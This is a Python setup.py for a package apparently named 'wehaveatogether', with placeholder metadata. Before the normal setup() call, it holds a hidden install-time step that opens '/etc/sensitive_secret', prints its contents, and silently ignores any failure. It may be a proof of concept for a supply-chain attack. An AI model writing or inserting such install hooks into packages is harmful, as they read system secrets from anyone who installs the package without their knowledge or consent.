from setuptools import setup, find_packages

try:
    with open('/etc/sensitive_secret', 'r') as f:
        content = f.read()
        print(content)
except:
    pass

setup(
    name="wehaveatogether",
    version="0.1.2",
    author="wehaveatogether",
    description="Short description of your package",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    install_requires=[],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
    python_requires=">=3.6",
)
